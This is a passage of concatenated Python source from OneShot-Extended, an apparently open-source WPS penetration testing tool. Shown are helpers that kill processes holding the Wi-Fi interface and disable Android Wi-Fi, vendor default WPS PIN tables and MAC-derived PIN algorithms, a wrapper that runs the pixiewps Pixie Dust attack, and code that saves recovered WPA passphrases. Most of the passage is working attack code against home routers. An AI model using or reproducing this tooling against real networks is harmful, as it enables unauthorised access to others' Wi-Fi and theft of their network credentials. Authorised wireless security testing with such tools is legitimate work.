def _getProcessCommand(pid: int) -> str:
    """Get the command line of a process from /proc."""

    try:
        with open(f'/proc/{pid}/cmdline', 'r', encoding='utf-8') as f:
            cmdline = f.read().replace('\0', ' ').strip()

            return cmdline
    except OSError:
        return ''

def checkRunningProcesses(interface: str):
    """Detect and warn about other processes actively using the generic netlink subsystem."""

    interfering_pids = _getInterferingProcesses()

    if interfering_pids:
        processes_str = ', '.join([f"{pname} (PID {pid})" for pid, pname in interfering_pids])
        logger.warning(f"Another process is using the {interface} interface: {processes_str}")

def killInterfering():
    """Kill all processes actively using the generic netlink subsystem."""

    interfering_pids = _getInterferingProcesses()
    killed_processes = []

    if interfering_pids:
        for pid, pname in interfering_pids:
            try:
                cmdline = _getProcessCommand(pid)
                os.kill(pid, 15)
                logger.warning(f"Terminated process {pname} (PID {pid})")
                killed_processes.append((pid, pname, cmdline))

                # Give time to release locks
                time.sleep(1.5)
            except OSError as e:
                logger.error(f"Failed to terminate {pname} (PID {pid}): {e}")

        _saveKilledProcesses(killed_processes)

def restoreProcesses():
    """Restore processes that were previously killed."""

    killed_file = os.path.join(SESSIONS_DIR, 'killed_processes.json')

    if not os.path.exists(killed_file):
        return

    try:
        with open(killed_file, 'r', encoding='utf-8') as f:
            killed_processes = json.load(f)
    except (IOError, json.JSONDecodeError) as e:
        logger.error(f"Failed to read killed processes file: {e}")
        return

    for pid, pname, cmdline in killed_processes:
        if not cmdline:
            logger.warning(f"Cannot restore {pname} (PID {pid}): command line not available")
            continue

        try:
            subprocess.Popen(cmdline,
                shell=True, stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            logger.info(f"Restored process {pname}")
        except (OSError, subprocess.CalledProcessError) as e:
            logger.error(f"Failed to restore {pname}: {e}")

    try:
        os.remove(killed_file)
    except OSError:
        pass

def ifaceCtl(interface: str, action: str):
    """Put an interface up or down."""

    command = ['ip', 'link', 'set', f'{interface}', f'{action}']

    try:
        command_output = subprocess.run(command,
            encoding='utf-8', stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT
        )
    except (subprocess.CalledProcessError, FileNotFoundError) as error:
        logger.error(f'Can not control interface with ip link: \n {error}')

    command_output_stripped = command_output.stdout.strip()

    if isAndroid() is False:
        def _rfKillUnblock():
            rfkill_command = ['rfkill', 'unblock', 'wifi']

            if not which(rfkill_command[0]):
                logger.warning('rfkill utility is not available, unable to do anything')
                return

            try:
                subprocess.run(rfkill_command, check=True)
            except (subprocess.CalledProcessError, FileNotFoundError) as error:
                logger.error(f'Failed to unblock interface, not continuing: \n {error}')

        if 'RF-kill' in command_output_stripped:
            logger.warning('RF-kill is blocking the interface, unblocking')
            _rfKillUnblock()
            return

    if command_output.returncode != 0:
        logger.error(command_output_stripped)

    return command_output.returncode

def isInterfaceUp(interface: str) -> bool:
    """Check if the network interface is still up."""

    try:
        command = ['ip', 'link', 'show', interface]
        output = subprocess.run(command,
            encoding='utf-8', stdout=subprocess.PIPE,
            stderr=subprocess.PIPE, timeout=5
        )

        if output.returncode != 0:
            return False

        if 'UP' in output.stdout:
            return True

        return False

    except (OSError, subprocess.CalledProcessError, subprocess.TimeoutExpired):
        return False

def addVulnerableAP(network_info: dict, vuln_list_file: str):
    """Add vulnerable device model/name to the vulnerable APs list."""

    if not network_info:
        return

    model = network_info.get('Model', '').strip()
    model_number = network_info.get('Model number', '').strip()
    device_name = network_info.get('Device name', '').strip()

    vuln_entry = None

    if model:
        vuln_entry = f'{model} {model_number}'.strip() if model_number else model
    elif device_name:
        vuln_entry = device_name

    if not vuln_entry:
        logger.warning('No model or device name information available to save')
        return

    try:
        # Check if entry already exists in the list
        try:
            with open(vuln_list_file, 'r', encoding='utf-8') as f:
                existing_entries = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            existing_entries = []

        if vuln_entry in existing_entries:
            logger.info(f'Device {vuln_entry} is already in the vulnerable list')
            return

        # Append entry to the vulnerable list
        with open(vuln_list_file, 'a', encoding='utf-8') as f:
            f.write(f'{vuln_entry}\n')
            logger.info(f'Added {vuln_entry} to vulnerable list')
    except IOError as e:
        logger.error(f'Failed to save to vulnerable list: {e}')

def isAndroid():
    """Check if this project is ran on android."""

    return bool(hasattr(sys, 'getandroidapilevel'))

def clearScreen():
    """Clear the terminal screen."""

    sys.stdout.write('\033[H\033[2J')
    sys.stdout.flush()

def die(text: str):
    """Print an error and exit with non-zero exit code."""

    sys.exit(f'[!] {text} \n')


# ============================================================================
# SOURCE: src/wifi/android.py
# ============================================================================
#  OneShot-Extended (WPS penetration testing utility) is a fork of the tool with extra features
#  Copyright (C) 2026 chkndrp
#
#  This program is free software; you can redistribute it and/or
#  modify it under the terms of the GNU General Public License
#  as published by the Free Software Foundation; either version 2
#  of the License, or (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.

import subprocess
import time

from src import logger

class AndroidNetwork:
    """Manages android Wi-Fi-related settings"""

    def __init__(self):
        self.ENABLED_SCANNING = 0

    def storeAlwaysScanState(self):
        """Stores Initial Wi-Fi 'always-scanning' state, so it can be restored on exit"""

        settings_cmd = ['settings', 'get', 'global', 'wifi_scan_always_enabled']

        try:
            is_scanning_on = subprocess.run(
                settings_cmd,
                encoding='utf-8',
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                check=True
            )
            is_scanning_on = is_scanning_on.stdout.strip()

            if is_scanning_on == '1':
                self.ENABLED_SCANNING = 1
        except subprocess.CalledProcessError:
            logger.info('[-] Failed to get initial Wi-Fi scanning state, assuming it\'s enabled')
            self.ENABLED_SCANNING = 1

    def disableWifi(self, force_disable: bool = False, whisper: bool = False):
        """Disable Wi-Fi connectivity on Android."""

        if whisper is False:
            logger.info('[*] Android: disabling Wi-Fi')

        wifi_disable_scanner_cmd = ['cmd', 'wifi', 'set-wifi-enabled', 'disabled']
        wifi_disable_always_scanning_cmd = ['cmd', '-w', 'wifi', 'set-scan-always-available', 'disabled']

        # Disable Android Wi-Fi scanner
        try:
            subprocess.run(wifi_disable_scanner_cmd)
        except subprocess.CalledProcessError:
            logger.info('[-] Failed to disable Wi-Fi scanner, skipping')

        # Always scanning for networks causes the interface to be occupied by android
        if self.ENABLED_SCANNING == 1 or force_disable is True:
            try:
                subprocess.run(wifi_disable_always_scanning_cmd)
            except subprocess.CalledProcessError:
                logger.info('[-] Failed to disable always-on Wi-Fi scanning, skipping')

        time.sleep(3)

    def enableWifi(self, force_enable: bool = False, whisper: bool = False):
        """Enable Wi-Fi connectivity on Android."""

        if whisper is False:
            logger.info('[*] Android: enabling Wi-Fi')

        wifi_enable_scanner_cmd = ['cmd', 'wifi', 'set-wifi-enabled', 'enabled']
        wifi_enable_always_scanning_cmd = ['cmd', '-w', 'wifi', 'set-scan-always-available', 'enabled']

        # Enable Android Wi-Fi scanner
        try:
            subprocess.run(wifi_enable_scanner_cmd)
        except subprocess.CalledProcessError:
            logger.info('[!] Failed to enable Wi-Fi scanner, skipping')

        if self.ENABLED_SCANNING == 1 or force_enable is True:
            try:
                subprocess.run(wifi_enable_always_scanning_cmd)
            except subprocess.CalledProcessError:
                logger.info('[-] Failed to enable always-on Wi-Fi scanning, skipping')


# ============================================================================
# SOURCE: src/wps/generator.py
# ============================================================================
#  OneShot-Extended (WPS penetration testing utility) is a fork of the tool with extra features
#  Copyright (C) 2026 chkndrp
#
#  This program is free software; you can redistribute it and/or
#  modify it under the terms of the GNU General Public License
#  as published by the Free Software Foundation; either version 2
#  of the License, or (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.

from src import logger

class NetworkAddress:
    """Handles MAC addresses"""

    def __init__(self, mac):
        if isinstance(mac, int):
            self._INT_REPR = mac
            self._STR_REPR = self._int2mac(mac)
        elif isinstance(mac, str):
            self._STR_REPR = mac.replace('-', ':').replace('.', ':').upper()
            self._INT_REPR = self._mac2int(mac)

    @staticmethod
    def _mac2int(mac) -> int:
        """Converts MAC address to integer"""
        return int(mac.replace(':', ''), 16)

    @staticmethod
    def _int2mac(mac) -> str:
        """Converts integer to MAC address"""
        mac = hex(mac).split('x')[-1].upper()
        mac = mac.zfill(12)
        mac = ':'.join(mac[i: i + 2] for i in range(0, 12, 2))
        return mac

    @property
    def STRING(self):
        return self._STR_REPR

    @STRING.setter
    def STRING(self, value):
        self._STR_REPR = value
        self._INT_REPR = self._mac2int(value)

    @property
    def INTEGER(self):
        return self._INT_REPR

    @INTEGER.setter
    def INTEGER(self, value):
        self._INT_REPR = value
        self._STR_REPR = self._int2mac(value)

    def __int__(self):
        return self.INTEGER

    def __str__(self):
        return self.STRING

    def __iadd__(self, other):
        self.INTEGER += other

    def __isub__(self, other):
        self.INTEGER -= other

    def __eq__(self, other):
        return self.INTEGER == other.INTEGER

    def __ne__(self, other):
        return self.INTEGER != other.INTEGER

    def __lt__(self, other):
        return self.INTEGER < other.INTEGER

    def __gt__(self, other):
        return self.INTEGER > other.INTEGER

    def __repr__(self):
        return f'NetworkAddress(string={self._STR_REPR}, integer={self._INT_REPR})'

class WPSpin:
    """WPS pin generator."""

    def __init__(self):
        self.ALGO_MAC = 0
        self.ALGO_EMPTY = 1
        self.ALGO_STATIC = 2

        self.ALGOS = {'pin24': {'name': '24-bit PIN', 'mode': self.ALGO_MAC, 'gen': self._pin24},
                      'pin28': {'name': '28-bit PIN', 'mode': self.ALGO_MAC, 'gen': self._pin28},
                      'pin32': {'name': '32-bit PIN', 'mode': self.ALGO_MAC, 'gen': self._pin32},
                      'pinDLink': {'name': 'D-Link PIN', 'mode': self.ALGO_MAC, 'gen': self._pinDLink},
                      'pinDLink1': {'name': 'D-Link PIN +1', 'mode': self.ALGO_MAC, 'gen': self._pinDLink1},
                      'pinASUS': {'name': 'ASUS PIN', 'mode': self.ALGO_MAC, 'gen': self._pinASUS},
                      'pinAirocon': {'name': 'Airocon Realtek', 'mode': self.ALGO_MAC, 'gen': self._pinAirocon},
                      # Static pin algos
                      'pinEmpty': {'name': 'Empty PIN', 'mode': self.ALGO_EMPTY, 'gen': lambda mac: ''},
                      'pinCisco': {'name': 'Cisco', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
                      'pinBrcm1': {'name': 'Broadcom 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2017252},
                      'pinBrcm2': {'name': 'Broadcom 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4626484},
                      'pinBrcm3': {'name': 'Broadcom 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7622990},
                      'pinBrcm4': {'name': 'Broadcom 4', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6232714},
                      'pinBrcm5': {'name': 'Broadcom 5', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1086411},
                      'pinBrcm6': {'name': 'Broadcom 6', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3195719},
                      'pinAirc1': {'name': 'Airocon 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3043203},
                      'pinAirc2': {'name': 'Airocon 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7141225},
                      'pinDSL2740R': {'name': 'DSL-2740R', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6817554},
                      'pinRealtek1': {'name': 'Realtek 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9566146},
                      'pinRealtek2': {'name': 'Realtek 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9571911},
                      'pinRealtek3': {'name': 'Realtek 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4856371},
                      'pinUpvel': {'name': 'Upvel', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2085483},
                      'pinUR814AC': {'name': 'UR-814AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4397768},
                      'pinUR825AC': {'name': 'UR-825AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 529417},
                      'pinOnlime': {'name': 'Onlime', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9995604},
                      'pinEdimax': {'name': 'Edimax', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3561153},
                      'pinThomson': {'name': 'Thomson', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6795814},
                      'pinHG532x': {'name': 'HG532x', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3425928},
                      'pinH108L': {'name': 'H108L', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988},
                      'pinONO': {'name': 'CBN ONO', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9575521}}

    def promptPin(self, bssid: str):
        """Prompts to select a WPS pin from a list of suggested pins."""

        pins = self._getSuggested(bssid)

        if len(pins) > 1:
            logger.info(f'PINs generated for {bssid}:')
            logger.info('{:<3} {:<10} {:<}'.format(
                '#', 'PIN', 'Name'
            ))

            for i, pin in enumerate(pins):
                number = f'{i + 1})'
                line = '{:<3} {:<10} {:<}'.format(
                    number, pin['pin'], pin['name'])
                logger.info(line)

            while True:
                pin_no = input('Select the PIN: ')
                try:
                    if int(pin_no) in range(1, len(pins) + 1):
                        pin = pins[int(pin_no) - 1]['pin']
                    else:
                        raise ValueError
                except ValueError:
                    logger.warning('Invalid number')
                else:
                    break

        elif len(pins) == 1:
            pin = pins[0]
            logger.info('The only probable PIN is selected: ' + pin['name'])
            pin = pin['pin']
        else:
            return None

        return pin

    def getLikely(self, bssid: str) -> list | None:
        """Returns a likely pin."""

        res = self._getSuggestedList(bssid)
        if res:
            return res[0]

        return None

    @staticmethod
    def checksum(pin: int) -> int:
        """Standard WPS checksum algorithm."""

        accum = 0
        while pin:
            accum += (3 * (pin % 10))
            pin = int(pin / 10)
            accum += (pin % 10)
            pin = int(pin / 10)
        return (10 - accum % 10) % 10

    @staticmethod
    def _suggest(bssid: str) -> list:
        """Get algo suggestions for a BSSID."""

        mac = bssid.replace(':', '').upper()
        algorithms = {
            'pin24': ('04BF6D', '0E5D4E', '107BEF', '14A9E3', '28285D', '2A285D', '32B2DC', '381766', '404A03', '4E5D4E', '5067F0', '5CF4AB', '6A285D', '8E5D4E', 'AA285D', 'B0B2DC', 'C86C87', 'CC5D4E', 'CE5D4E', 'EA285D', 'E243F6', 'EC43F6', 'EE43F6', 'F2B2DC', 'FCF528', 'FEF528', '4C9EFF', '0014D1', 'D8EB97', '1C7EE5', '84C9B2', 'FC7516', '14D64D', '9094E4', 'BCF685', 'C4A81D', '00664B', '087A4C', '14B968', '2008ED', '346BD3', '4CEDDE', '786A89', '88E3AB', 'D46E5C', 'E8CD2D', 'EC233D', 'ECCB30', 'F49FF3', '20CF30', '90E6BA', 'E0CB4E', 'D4BF7F4', 'F8C091', '001CDF', '002275', '08863B', '00B00C', '081075', 'C83A35', '0022F7', '001F1F', '00265B', '68B6CF', '788DF7', 'BC1401', '202BC1', '308730', '5C4CA9', '62233D', '623CE4', '623DFF', '6253D4', '62559C', '626BD3', '627D5E', '6296BF', '62A8E4', '62B686', '62C06F', '62C61F', '62C714', '62CBA8', '62CDBE', '62E87B', '6416F0', '6A1D67', '6A233D', '6A3DFF', '6A53D4', '6A559C', '6A6BD3', '6A96BF', '6A7D5E', '6AA8E4', '6AC06F', '6AC61F', '6AC714', '6ACBA8', '6ACDBE', '6AD15E', '6AD167', '721D67', '72233D', '723CE4', '723DFF', '7253D4', '72559C', '726BD3', '727D5E', '7296BF', '72A8E4', '72C06F', '72C61F', '72C714', '72CBA8', '72CDBE', '72D15E', '72E87B', '0026CE', '9897D1', 'E04136', 'B246FC', 'E24136', '00E020', '5CA39D', 'D86CE9', 'DC7144', '801F02', 'E47CF9', '000CF6', '00A026', 'A0F3C1', '647002', 'B0487A', 'F81A67', 'F8D111', '34BA9A', 'B4944E'),
            'pin28': ('200BC7', '4846FB', 'D46AA8', 'F84ABF'),
            'pin32': ('000726', 'D8FEE3', 'FC8B97', '1062EB', '1C5F2B', '48EE0C', '802689', '908D78', 'E8CC18', '2CAB25', '10BF48', '14DAE9', '3085A9', '50465D', '5404A6', 'C86000', 'F46D04', '3085A9', '801F02'),
            'pinDLink': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'A0AB1B', 'B8A386', 'C0A0BB', 'CCB255', 'FC7516', '0014D1', 'D8EB97'),
            'pinDLink1': ('0018E7', '00195B', '001CF0', '001E58', '002191', '0022B0', '002401', '00265A', '14D64D', '1C7EE5', '340804', '5CD998', '84C9B2', 'B8A386', 'C8BE19', 'C8D3A3', 'CCB255', '0014D1'),
            'pinASUS': ('049226', '04D9F5', '08606E', '0862669', '107B44', '10BF48', '10C37B', '14DDA9', '1C872C', '1CB72C', '2C56DC', '2CFDA1', '305A3A', '382C4A', '38D547', '40167E', '50465D', '54A050', '6045CB', '60A44C', '704D7B', '74D02B', '7824AF', '88D7F6', '9C5C8E', 'AC220B', 'AC9E17', 'B06EBF', 'BCEE7B', 'C860007', 'D017C2', 'D850E6', 'E03F49', 'F0795978', 'F832E4', '00072624', '0008A1D3', '00177C', '001EA6', '00304FB', '00E04C0', '048D38', '081077', '081078', '081079', '083E5D', '10FEED3C', '181E78', '1C4419', '2420C7', '247F20', '2CAB25', '3085A98C', '3C1E04', '40F201', '44E9DD', '48EE0C', '5464D9', '54B80A', '587BE906', '60D1AA21', '64517E', '64D954', '6C198F', '6C7220', '6CFDB9', '78D99FD', '7C2664', '803F5DF6', '84A423', '88A6C6', '8C10D4', '8C882B00', '904D4A', '907282', '90F65290', '94FBB2', 'A01B29', 'A0F3C1E', 'A8F7E00', 'ACA213', 'B85510', 'B8EE0E', 'BC3400', 'BC9680', 'C891F9', 'D00ED90', 'D084B0', 'D8FEE3', 'E4BEED', 'E894F6F6', 'EC1A5971', 'EC4C4D', 'F42853', 'F43E61', 'F46BEF', 'F8AB05', 'FC8B97', '7062B8', '78542E', 'C0A0BB8C', 'C412F5', 'C4A81D', 'E8CC18', 'EC2280', 'F8E903F4'),
            'pinAirocon': ('0007262F', '000B2B4A', '000EF4E7', '001333B', '00177C', '001AEF', '00E04BB3', '02101801', '0810734', '08107710', '1013EE0', '2CAB25C7', '788C54', '803F5DF6', '94FBB2', 'BC9680', 'F43E61', 'FC8B97'),
            'pinEmpty': ('E46F13', 'EC2280', '58D56E', '1062EB', '10BEF5', '1C5F2B', '802689', 'A0AB1B', '74DADA', '9CD643', '68A0F6', '0C96BF', '20F3A3', 'ACE215', 'C8D15E', '000E8F', 'D42122', '3C9872', '788102', '7894B4', 'D460E3', 'E06066', '004A77', '2C957F', '64136C', '74A78E', '88D274', '702E22', '74B57E', '789682', '7C3953', '8C68C8', 'D476EA', '344DEA', '38D82F', '54BE53', '709F2D', '94A7B7', '981333', 'CAA366', 'D0608C'),
            'pinCisco': ('001A2B', '00248C', '002618', '344DEB', '7071BC', 'E06995', 'E0CB4E', '7054F5'),
            'pinBrcm1': ('ACF1DF', 'BCF685', 'C8D3A3', '988B5D', '001AA9', '14144B', 'EC6264'),
            'pinBrcm2': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19'),
            'pinBrcm3': ('14D64D', '1C7EE5', '28107B', 'B8A386', 'BCF685', 'C8BE19', '7C034C'),
            'pinBrcm4': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinBrcm5': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinBrcm6': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinAirc1': ('181E78', '40F201', '44E9DD', 'D084B0'),
            'pinAirc2': ('84A423', '8C10D4', '88A6C6'),
            'pinDSL2740R': ('00265A', '1CBDB9', '340804', '5CD998', '84C9B2', 'FC7516'),
            'pinRealtek1': ('0014D1', '000C42', '000EE8'),
            'pinRealtek2': ('007263', 'E4BEED'),
            'pinRealtek3': ('08C6B3',),
            'pinUpvel': ('784476', 'D4BF7F0', 'F8C091'),
            'pinUR814AC': ('D4BF7F60',),
            'pinUR825AC': ('D4BF7F5',),
            'pinOnlime': ('D4BF7F', 'F8C091', '144D67', '784476', '0014D1'),
            'pinEdimax': ('801F02', '00E04C'),
            'pinThomson': ('002624', '4432C8', '88F7C7', 'CC03FA'),
            'pinHG532x': ('00664B', '086361', '087A4C', '0C96BF', '14B968', '2008ED', '2469A5', '346BD3', '786A89', '88E3AB', '9CC172', 'ACE215', 'D07AB5', 'CCA223', 'E8CD2D', 'F80113', 'F83DFF'),
            'pinH108L': ('4C09B4', '4CAC0A', '84742A4', '9CD24B', 'B075D5', 'C864C7', 'DC028E', 'FCC897'),
            'pinONO': ('5C353B', 'DC537C')
        }
        res = []
        for algo_id, masks in algorithms.items():
            if mac.startswith(masks):
                res.append(algo_id)

        return res

    @staticmethod
    def _pin24(bssid: str):
        return bssid.INTEGER & 0xFFFFFF

    @staticmethod
    def _pin28(bssid: str):
        return bssid.INTEGER & 0xFFFFFFF

    @staticmethod
    def _pin32(bssid: str):
        return bssid.INTEGER % 0x100000000

    @staticmethod
    def _pinDLink(bssid: str):
        # Get the NIC part
        nic = bssid.INTEGER & 0xFFFFFF
        # Calculating pin
        pin = nic ^ 0x55AA55
        pin ^= (((pin & 0xF) << 4) +
                ((pin & 0xF) << 8) +
                ((pin & 0xF) << 12) +
                ((pin & 0xF) << 16) +
                ((pin & 0xF) << 20))
        pin %= int(10e6)
        if pin < int(10e5):
            pin += ((pin % 9) * int(10e5)) + int(10e5)

        return pin

    @staticmethod
    def _pinASUS(bssid: str):
        b = [int(i, 16) for i in str(bssid).split(':')]
        pin = ''
        for i in range(7):
            pin += str((b[i % 6] + b[5]) % (10 - (i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7))

        return int(pin)

    @staticmethod
    def _pinAirocon(bssid: str):
        b = [int(i, 16) for i in str(bssid).split(':')]
        pin = ((b[0] + b[1]) % 10)\
        + (((b[5] + b[0]) % 10) * 10)\
        + (((b[4] + b[5]) % 10) * 100)\
        + (((b[3] + b[4]) % 10) * 1000)\
        + (((b[2] + b[3]) % 10) * 10000)\
        + (((b[1] + b[2]) % 10) * 100000)\
        + (((b[0] + b[1]) % 10) * 1000000)

        return pin

    def _pinDLink1(self, bssid: str):
        bssid.INTEGER += 1
        return self._pinDLink(bssid)

    def _generate(self, algo: str, bssid: str):
        """WPS pin generator."""

        mac = NetworkAddress(bssid)
        if algo not in self.ALGOS:
            raise ValueError('Invalid WPS pin algorithm')

        pin = self.ALGOS[algo]['gen'](mac)

        if algo == 'pinEmpty':
            return pin

        pin = pin % 10000000
        pin = str(pin) + str(self.checksum(pin))
        return pin.zfill(8)

    def _getSuggested(self, bssid: str):
        """Get all suggested WPS pin's for single MAC."""

        algos = self._suggest(bssid)
        res = []
        for identification in algos:
            algo = self.ALGOS[identification]
            item = {}
            item['id'] = identification

            if algo['mode'] == self.ALGO_STATIC:
                item['name'] = 'Static PIN — ' + algo['name']
            else:
                item['name'] = algo['name']

            item['pin'] = self._generate(identification, bssid)
            res.append(item)
        return res

    def _getSuggestedList(self, bssid: str):
        """Get all suggested WPS pin's for single MAC as list."""

        algos = self._suggest(bssid)
        res = []
        for algo in algos:
            res.append(self._generate(algo, bssid))

        return res


# ============================================================================
# SOURCE: src/wps/pixiewps.py
# ============================================================================
#  OneShot-Extended (WPS penetration testing utility) is a fork of the tool with extra features
#  Copyright (C) 2026 chkndrp
#
#  This program is free software; you can redistribute it and/or
#  modify it under the terms of the GNU General Public License
#  as published by the Free Software Foundation; either version 2
#  of the License, or (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.

import subprocess

from src import logger

class Data:
    """Stored data used for pixiewps command."""

    def __init__(self):
        self.PKE = ''
        self.PKR = ''
        self.E_HASH1 = ''
        self.E_HASH2 = ''
        self.AUTHKEY = ''
        self.E_NONCE = ''
        self.R_NONCE = ''
        self.BSSID = ''

    def getAll(self):
        """Output all pixiewps related variables."""

        return all([self.PKE, self.PKR, self.E_NONCE, self.R_NONCE, self.AUTHKEY, self.E_HASH1, self.E_HASH2, self.BSSID])

    def runPixieWps(self, show_command: bool = False, full_range: bool = False) -> str | bool:
        """Runs the pixiewps and attempts to extract the WPS pin from the output."""

        logger.info('Running Pixiewps…')
        command = self._getPixieCmd(full_range)

        if show_command:
            # Convert the command array into a string
            logger.info(' '.join(command))

        try:
            command_output = subprocess.run(command,
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                encoding='utf-8'
            )
        except (subprocess.CalledProcessError, FileNotFoundError) as error:
            logger.error(f'Pixiewps has exited on error: \n {error}')
            return False

        print(command_output.stdout)

        if command_output.returncode == 0:
            lines = command_output.stdout.splitlines()
            for line in lines:
                if ('[+]' in line) and ('WPS pin' in line):
                    pin = line.split(':')[-1].strip()

                    if pin == '<empty>':
                        pin = '\'\''

                    return pin

        return False

    def _getPixieCmd(self, full_range: bool = False) -> list[str]:
        """Generates a list representing the command for the pixiewps tool."""

        pixiecmd = ['pixiewps']
        pixiecmd.extend([
            '--pke', self.PKE,
            '--pkr', self.PKR,
            '--e-hash1', self.E_HASH1,
            '--e-hash2', self.E_HASH2,
            '--authkey', self.AUTHKEY,
            '--e-nonce', self.E_NONCE,
            '--r-nonce', self.R_NONCE,
            '--e-bssid', self.BSSID
        ])

        # Enable all modes
        pixiecmd.extend(['--mode', '1,2,3,4,5'])

        if full_range:
            pixiecmd.append('--force')

        return pixiecmd

    def clear(self):
        """Resets the pixiewps variables."""
        self.__init__()


# ============================================================================
# SOURCE: src/wifi/collector.py
# ============================================================================
#  OneShot-Extended (WPS penetration testing utility) is a fork of the tool with extra features
#  Copyright (C) 2026 chkndrp
#
#  This program is free software; you can redistribute it and/or
#  modify it under the terms of the GNU General Public License
#  as published by the Free Software Foundation; either version 2
#  of the License, or (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.

import os
import subprocess
import csv

from datetime import datetime
from shutil import which
from src import logger

import src.wifi.android
import src.utils

class WiFiCollector:
    """Allows for collecting result, pin or network."""

    def __init__(self):
        self.ANDROID_NETWORK = src.wifi.android.AndroidNetwork()

    @staticmethod
    def writeResult(bssid: str, essid: str, wps_pin: str, wpa_psk: str):
        """Writes the success result to a stored.{txt,csv} file."""

        reports_dir = src.utils.REPORTS_DIR
        filename = reports_dir + 'stored'

        # Prevent duplicate writes if the BSSID + PSK combo already exists
        if os.path.isfile(filename + '.csv'):
            with open(filename + '.csv', 'r', encoding='utf-8') as file:
                if any(f'"{bssid}"' in line and f'"{wpa_psk}"' in line for line in file):
                    return logger.info(f'[*] Credentials for {essid} ({bssid}) are already saved.')

        if not os.path.exists(reports_dir):
            os.makedirs(reports_dir)

        write_table_header = not os.path.isfile(filename + '.csv')
        date_str = datetime.now().strftime('%d.%m.%Y %H:%M')

        with open(filename + '.txt', 'a', encoding='utf-8') as file:
            file.write('{}\nBSSID: {}\nESSID: {}\nWPS PIN: {}\nWPA PSK: {}\n\n'.format(
                date_str, bssid, essid, wps_pin, wpa_psk
            ))

        with open(filename + '.csv', 'a', newline='', encoding='utf-8') as file:
            csv_writer = csv.writer(file,
                delimiter=';', quoting=csv.QUOTE_ALL
            )

            if write_table_header:
                csv_writer.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])

            csv_writer.writerow([date_str, bssid, essid, wps_pin, wpa_psk])

        logger.info(f'[*] Credentials saved to {filename}.txt, {filename}.csv')

    @staticmethod
    def writePin(bssid: str, pin: str):
        """Writes PIN to a file for later use."""

        pixiewps_dir = src.utils.PIXIEWPS_DIR
        filename = f'''{pixiewps_dir}{bssid.replace(':', '').upper()}.run'''

        with open(filename, 'w', encoding='utf-8') as file:
            file.write(pin)

        logger.info(f'[*] PIN saved in {filename}')


# ============================================================================
# SOURCE: src/wifi/scanner.py
# ============================================================================
#  OneShot-Extended (WPS penetration testing utility) is a fork of the tool with extra features
#  Copyright (C) 2026 chkndrp
#
#  This program is free software; you can redistribute it and/or
#  modify it under the terms of the GNU General Public License
#  as published by the Free Software Foundation; either version 2
#  of the License, or (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.

import re
import csv
import codecs
import subprocess

from src import logger
from src.utils import REPORTS_DIR

import src.args
import src.utils

args = None  # Set in main()

# --- Shared WPS regexes (used by both the scan table and the single-AP probe) ---
_RE_BSS    = re.compile(r'BSS (\S+)( )?\(on \w+\)')
_RE_SSID   = re.compile(r'SSID: (.*)')
_RE_WPS    = re.compile(r'WPS:\t [*] Version: (([0-9]*[.])?[0-9]+)')
_RE_WPS_V2 = re.compile(r' [*] Version2: (.+)')
